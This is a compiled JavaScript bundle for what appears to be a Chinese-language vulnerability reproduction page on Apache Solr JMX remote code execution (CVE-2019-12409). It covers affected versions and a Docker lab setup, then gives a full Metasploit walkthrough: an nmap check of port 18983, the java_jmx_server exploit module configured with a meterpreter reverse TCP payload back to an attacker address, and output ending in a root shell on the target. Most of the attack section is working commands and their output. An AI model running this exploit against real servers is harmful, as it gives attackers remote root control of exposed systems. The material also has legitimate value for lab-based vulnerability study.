(window.webpackJsonp=window.webpackJsonp||[]).push([[354],{1944:function(s,t,a){s.exports=a.p+"assets/img/98733fe0-bd66-40d2-95ff-322723fcf123.f664744f.png"},1945:function(s,t,a){s.exports=a.p+"assets/img/ce0defa5-e90a-4885-bb1f-b1bbf8425b16.db5b79c1.png"},2409:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"apache-solr-jmx服务-rce-cve-2019-12409"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-jmx服务-rce-cve-2019-12409"}},[s._v("#")]),s._v(" Apache Solr JMX服务 RCE CVE-2019-12409")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。")]),s._v(" "),n("h2",{attrs:{id:"影响版本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("Apache Solr 8.1.1")]),n("br"),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("Apache Solr 8.2.0")]),n("br"),s._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" pull solr:8.2.0\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" run --name solr -d -p "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("8983")]),s._v(":8983 -t solr:8.2.0\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的·ENABLE_REMOTE_JMX_OPTS·选项设置是否为“Ture”，如果为Ture，则存在漏洞")]),s._v(" "),n("p",[s._v("查看漏洞端口18983是否开放")]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("nmap xxx.xxx.xxx.xxx -p "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("18983")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1944),alt:"98733fe0-bd66-40d2-95ff-322723fcf123"}})]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("root@kali:~/桌面"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# msfconsole")]),s._v("\n                                                  \n     ,           ,\n    /             "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n   "),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("((")]),s._v("__"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("__"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")])]),s._v("\n      "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" O O "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("_________\n         "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" _ /            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n          o_o "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("   M S F   "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n               "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("   _____  "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("  *\n                "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   WW"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n                "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("     "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n\n\n       "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" metasploit v5.0.101-dev                         "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2049")]),s._v(" exploits - "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1108")]),s._v(" auxiliary - "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("344")]),s._v(" post       "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("562")]),s._v(" payloads - "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("45")]),s._v(" encoders - "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(" nops            "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(" evasion                                       "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nMetasploit tip: Writing a custom module? After editing your module, why not try the reload "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("command")]),s._v("\n\nmsf5 "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/multi/misc/java_jmx_server\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf5 exploit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/misc/java_jmx_server"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhost "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146\nrhost "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146\nmsf5 exploit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/misc/java_jmx_server"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rport "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("18983")]),s._v("\nrport "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("18983")]),s._v("\nmsf5 exploit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/misc/java_jmx_server"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload java/meterpreter/reverse_tcp\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" java/meterpreter/reverse_tcp\nmsf5 exploit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/misc/java_jmx_server"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" options\n\nModule options "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("exploit/multi/misc/java_jmx_server"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(":\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   JMXRMI        jmxrmi           "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The name where the JMX RMI interface is bound\n   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint\n   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint\n   RHOSTS        "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146   "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The target host"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(", range CIDR identifier, or hosts "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" with syntax "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'file:<path>'")]),s._v("\n   RPORT         "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("18983")]),s._v("            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The target port "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("TCP"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   SRVHOST       "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0          "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" or network interface to listen on. This must be an address on the "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" machine or "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0 to listen on all addresses.\n   SRVPORT       "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("8080")]),s._v("             "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" port to listen on.\n   SSLCert                        no        Path to a custom SSL certificate "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("default is randomly generated"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   URIPATH                        no        The URI to use "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" this exploit "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("default is random"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\nPayload options "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("java/meterpreter/reverse_tcp"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(":\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.149   "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The listen address "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("an interface may be specified"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   LPORT  "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("             "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("   Generic "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Java Payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\nmsf5 exploit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/misc/java_jmx_server"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" run\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Started reverse TCP handler on "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.149:4444 \n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Sending RMI Header"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Discovering the JMXRMI endpoint"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - JMXRMI endpoint on "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".1.1:18983\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Proceeding with handshake"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Handshake with JMX MBean server on "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".1.1:18983\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Loading payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Replied to request "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" mlet\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Replied to request "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" payload JAR\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Executing payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:18983 - Replied to request "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" payload JAR\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Sending stage "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("53944")]),s._v(" bytes"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" to "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Meterpreter session "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" opened "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.149:4444 -"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146:56234"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),s._v("-11-05 "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":17:04 +0800\n\n                                                                            \nmeterpreter "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("                                                                 \nmeterpreter "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" shell                                                            \nProcess "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" created.                                                              \nChannel "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" created.                                                                \n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("id")]),s._v("                                                                                 \n用户id"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" 组id"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" 组"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br"),n("span",{staticClass:"line-number"},[s._v("83")]),n("br"),n("span",{staticClass:"line-number"},[s._v("84")]),n("br"),n("span",{staticClass:"line-number"},[s._v("85")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1945),alt:"ce0defa5-e90a-4885-bb1f-b1bbf8425b16"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);